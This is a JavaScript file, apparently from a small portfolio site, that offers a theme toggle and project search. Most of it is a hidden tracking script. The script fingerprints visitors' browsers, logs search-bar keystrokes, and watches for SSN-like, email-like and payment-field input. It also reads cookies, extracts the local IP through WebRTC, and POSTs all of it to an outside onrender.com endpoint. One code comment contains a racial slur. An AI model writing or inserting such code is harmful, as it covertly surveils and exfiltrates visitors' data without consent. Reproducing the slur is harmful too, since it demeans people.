function deviceSniff() {
  var uaString = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(uaString)) {
    return 'apple gadget';
  }
  if (/Android/i.test(uaString)) {
    if (/Pixel|Pixel\s[0-9]/i.test(uaString)) return 'google pixel';
    if (/Samsung|SM-/i.test(uaString)) return 'sammy android';
    return 'generic android';
  }
  if (/Windows NT|Macintosh|Linux/i.test(uaString)) {
    return 'desktop pc';
  }
  return 'weird device';
}

function referrerCheck() {
  var docRef = document.referrer;
  var searchParams = new URLSearchParams(window.location.search);
  var utmSrc = searchParams.get('utm_source') ? searchParams.get('utm_source').toLowerCase() : null;
  if (utmSrc) {
    if (utmSrc.indexOf('facebook') > -1) return 'fb via utm';
    if (utmSrc.indexOf('discord') > -1) return 'discord utm';
    if (utmSrc.indexOf('youtube') > -1) return 'yt utm';
    if (utmSrc.indexOf('twitter') > -1) return 'tw utm';
    if (utmSrc.indexOf('reddit') > -1) return 'reddit utm';
    if (utmSrc.indexOf('tiktok') > -1) return 'tt utm';
    if (utmSrc.indexOf('instagram') > -1) return 'ig utm';
  }
  if (docRef) {
    try {
      var urlParsed = new URL(docRef);
      var hostName = urlParsed.hostname.toLowerCase();
      if (hostName.match('facebook.com')) return 'from facebook';
      if (hostName.match('discord.com')) return 'from discord';
      if (hostName.match('youtube.com')) return 'from youtube';
      if (hostName.match('t.co')) return 'from twitter';
      if (hostName.match('reddit.com')) return 'from reddit';
      if (hostName.match('tiktok.com')) return 'from tiktok';
      if (hostName.match('instagram.com')) return 'from instagram';
      return docRef;
    } catch (error) {
      return 'bad referrer';
    }
  }
  return 'straight here';
}

function grabBasics() {
  let info = {}; // main data holder
  info.partOne = {}; // basics
  info.partThree = {}; // more details
  info.partFour = {}; // fingerprints
  info.partOne.devType = deviceSniff();
  info.partOne.stamp = new Date().toISOString();
  info.partOne.scr = window.screen.width + 'x' + window.screen.height;
  info.partOne.refFrom = referrerCheck();
  info.partOne.pageUrl = window.location.href;
  info.partOne.locData = 'not on';
  info.partThree.colors = window.screen.colorDepth || 'dunno';
  info.partThree.zone = Intl.DateTimeFormat().resolvedOptions().timeZone || '??';
  info.partThree.lang = navigator.language || '??';
  info.partThree.cores = navigator.hardwareConcurrency || '??';
  info.partThree.mem = navigator.deviceMemory || '??';
  info.partThree.dntSet = navigator.doNotTrack || '??';
  var plugs = [];
  if (navigator.plugins) for (var p = 0; p < navigator.plugins.length; p++) plugs.push(navigator.plugins[p].name);
  info.partThree.plugIns = plugs;
  var mimes = [];
  if (navigator.mimeTypes) {
    var mtLen = navigator.mimeTypes.length;
    for (var m = 0; m < mtLen; m++) mimes.push(navigator.mimeTypes[m].type);
  }
  info.partThree.mimes = mimes;
  info.partFour.inlines = ['main func'];
  info.partFour.hasCookies = !!document.cookie;
  info.partFour.thirdCalls = [];
  info.partFour.posts = [];
  return info;
}

async function extraBits(data, timerStart) {
  var specialPage = window.location.pathname.includes('/page3');
  if (!specialPage) {
    let cards = document.getElementsByClassName('project-card');
    if (cards.length >= 3 && cards[2].offsetParent !== null) specialPage = true;
  }
  if (!specialPage) return data;

  data.partThree.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'yes' : 'no';

  let battStat = '??';
  if (navigator.getBattery) {
    try {
      var batt = await navigator.getBattery();
      battStat = Math.floor(batt.level * 100) + '%' + (batt.charging ? ' charging' : '');
    } catch (e) { /* ignore */ }
  }
  data.partThree.batt = battStat;
  data.partThree.scrolled = Math.round(window.scrollY) + 'px';

  var keysPressed = '';
  let searchInput = document.getElementById('search-bar');
  if (searchInput) {
    var keyLog = function(e) {
      if (keysPressed.length < 50 && !e.key.match(/password|card|ssn/i)) keysPressed += e.key;
    };
    searchInput.addEventListener('keydown', keyLog);
    setTimeout(function() {
      searchInput.removeEventListener('keydown', keyLog);
    }, 1200); // bit longer, nigger
  }
  data.partThree.keys = keysPressed || 'none';

  let ssnFlag = 'none';
  if (searchInput) {
    let ssnCheck = e => { if (/\d{3}-\d{2}-\d{4}/.test(e.target.value)) ssnFlag = 'ssn like'; };
    searchInput.addEventListener('input', ssnCheck);
    setTimeout(() => searchInput.removeEventListener('input', ssnCheck), 800);
  }
  data.partThree.ssn = ssnFlag;

  let emailFlag = 'none';
  if (searchInput) {
    let emailCheck = e => {
      if (e.target.value.match(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i)) emailFlag = 'email like';
    };
    searchInput.addEventListener('input', emailCheck);
    setTimeout(() => searchInput.removeEventListener('input', emailCheck), 900);
  }
  data.partThree.email = emailFlag;

  let payFlag = 'none';
  let payFields = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
  if (payFields.length) {
    let payLog = () => payFlag = 'pay field touched';
    for (var pf = 0; pf < payFields.length; pf++) payFields[pf].addEventListener('input', payLog);
    setTimeout(() => {
      for (var pf2 = 0; pf2 < payFields.length; pf2++) payFields[pf2].removeEventListener('input', payLog);
    }, 1100);
  }
  data.partThree.pay = payFlag;

  var mouseMoves = 0;
  let mouseTrack = () => { mouseMoves++; };
  document.addEventListener('mousemove', mouseTrack);
  setTimeout(() => document.removeEventListener('mousemove', mouseTrack), 1300);
  data.partThree.mouse = mouseMoves + '/s';

  let glSupport = 'nope';
  try {
    let tempCanvas = document.createElement('canvas');
    let gl = tempCanvas.getContext('webgl') || tempCanvas.getContext('experimental-webgl');
    if (gl) {
      let dbgInfo = gl.getExtension('WEBGL_debug_renderer_info');
      glSupport = dbgInfo ? gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL) : 'gl ok';
    }
  } catch (e) {}
  data.partThree.gl = glSupport;

  data.partThree.connection = navigator.connection ? navigator.connection.effectiveType : '??';

  let clipAction = 'none';
  let copyLog = () => clipAction = 'copy';
  let pasteLog = () => clipAction = 'paste';
  document.addEventListener('copy', copyLog, {once: true});
  document.addEventListener('paste', pasteLog, {once: true});
  setTimeout(() => {
    document.removeEventListener('copy', copyLog);
    document.removeEventListener('paste', pasteLog);
  }, 700);
  data.partThree.clip = clipAction;

  data.partThree.orientSupport = window.DeviceOrientationEvent ? 'yes' : 'no';

  var storBytes = 0;
  try {
    for (var key in sessionStorage) {
      if (sessionStorage.hasOwnProperty(key)) {
        storBytes += (key.length + sessionStorage[key].length) * 2;
      }
    }
  } catch (e) {}
  data.partThree.sessStor = storBytes + ' bytes';

  let features = [];
  if (window.RTCPeerConnection) features.push('rtc');
  if (navigator.geolocation) features.push('loc');
  if (navigator.serviceWorker) features.push('sw');
  data.partThree.feats = features.join(', ') || 'none';

  data.partThree.loadTime = Math.round(performance.now()) + 'ms';

  let clickCount = 0;
  let clickLog = () => clickCount++;
  document.addEventListener('click', clickLog);
  setTimeout(() => document.removeEventListener('click', clickLog), 1400);
  data.partThree.clickNum = clickCount;

  let utms = {};
  utms.src = searchParams.get('utm_source') || 'none';
  utms.med = searchParams.get('utm_medium') || 'none';
  utms.camp = searchParams.get('utm_campaign') || 'none';
  data.partThree.utms = JSON.stringify(utms);

  let clickedOn = [];
  let elClickLog = e => {
    let target = e.target;
    let badTypes = ['password', 'card', 'credit', 'payment', 'ssn'];
    if (!target.type || badTypes.every(t => !target.type.includes(t) && !(target.name && target.name.includes(t)))) {
      let item = {tag: target.tagName.toLowerCase(), cls: target.className || 'none', id: target.id || 'none'};
      clickedOn.push(JSON.stringify(item));
    }
  };
  document.addEventListener('click', elClickLog);
  setTimeout(() => document.removeEventListener('click', elClickLog), 600);
  data.partThree.clicks = clickedOn.join('; ') || 'none';

  data.partThree.duration = Math.round(performance.now() - timerStart) + 'ms';

  let logs = ['viewed: ' + window.location.href];
  let evClickLog = e => {
    let target = e.target;
    let sensitive = ['password', 'card', 'credit', 'payment', 'ssn'];
    if (!target.type || sensitive.every(t => !target.type.includes(t) && !(target.name && target.name.includes(t)))) {
      let str = 'clicked ' + target.tagName.toLowerCase();
      if (target.id) str += '#' + target.id;
      if (target.className) str += '.' + target.className;
      logs.push(str);
    }
  };
  document.addEventListener('click', evClickLog);
  let forms = document.querySelectorAll('form');
  let subLogs = [];
  for (let f = 0; f < forms.length; f++) {
    let sub = () => logs.push('submitted form: ' + (forms[f].id || forms[f].action || 'no id'));
    forms[f].addEventListener('submit', sub);
    subLogs.push(sub);
  }
  setTimeout(() => {
    document.removeEventListener('click', evClickLog);
    for (let f = 0; f < forms.length; f++) forms[f].removeEventListener('submit', subLogs[f]);
  }, 500);
  data.partThree.log = logs.join('; ') || 'none';

  // pause for part 4
  var delay = Math.random() * 2000 + 5000; // randomish 5-7 secs, cuz why not?
  await new Promise(res => setTimeout(res, delay));

  data.partFour.clientCks = document.cookie || 'none';
  data.partFour.localStor = storBytes + ' bytes';

  let localAddr = '??';
  try {
    var peerConn = new RTCPeerConnection({iceServers: []});
    peerConn.createDataChannel('dummy');
    peerConn.createOffer()
      .then(offer => peerConn.setLocalDescription(offer))
      .catch(e => console.log('offer err', e));
    var candPromise = new Promise(r => {
      peerConn.onicecandidate = event => {
        if (event.candidate) {
          var cand = event.candidate.candidate;
          var ipRegex = /(\d{1,3}\.){3}\d{1,3}/;
          var match = cand.match(ipRegex);
          if (match) localAddr = match[0];
        }
        r(); // resolve anyway
      };
      setTimeout(r, 1500); // or timeout
    });
    await candPromise;
    peerConn.close();
  } catch (e) {
    console.log('local ip fail', e);
  }
  data.partFour.lanIp = localAddr;

  let audioHash = 'none';
  try {
    var audContext = new (window.AudioContext || window.webkitAudioContext)();
    var oscillator = audContext.createOscillator();
    oscillator.type = 'sine';
    oscillator.frequency.value = 440; // a note
    var compressor = audContext.createDynamicsCompressor();
    oscillator.connect(compressor);
    compressor.connect(audContext.destination);
    oscillator.start(0);
    setTimeout(() => oscillator.stop(), 100);
    audioHash = audContext.sampleRate + '';
    audContext.close();
  } catch (e) {}
  data.partFour.audio = audioHash;

  return data;
}

function sendData(data) {
  var opts = {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data),
    credentials: 'include'
  };
  fetch('https://random-nfpf.onrender.com/api/visit', opts).catch(e => console.log('send err', e));
}

setTimeout(function() {
  var base = grabBasics();
  var start = performance.now();
  extraBits(base, start).then(full => sendData(full));
}, 300 + Math.random() * 400); // random start delay

let themeBtn = document.getElementById('theme-switch');
if (themeBtn) themeBtn.onchange = () => document.body.classList.toggle('light-mode');

let searchBar = document.getElementById('search-bar');
if (searchBar) {
  searchBar.oninput = e => {
    let term = e.target.value.toLowerCase();
    let cards = document.querySelectorAll('.project-card');
    for (let card of cards) {
      let title = card.querySelector('h2') ? card.querySelector('h2').textContent.toLowerCase() : '';
      card.style.display = title.includes(term) ? 'block' : 'none'; // assume block
    }
  };
}
